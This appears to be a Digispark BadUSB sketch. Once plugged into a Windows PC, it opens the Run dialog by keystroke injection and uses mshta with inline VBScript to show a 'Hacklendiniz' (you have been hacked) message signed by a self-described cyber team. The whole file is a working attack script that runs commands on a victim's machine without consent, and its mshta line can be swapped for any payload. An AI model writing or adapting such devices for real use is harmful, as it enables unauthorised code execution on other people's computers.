#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("mshta vbscript:Execute(\"msgbox(\"\"Hacklendiniz \"\" ,64, \"\"Karaelmas Cyber Team\"\")(window.close)\")");


}
void loop() {

}
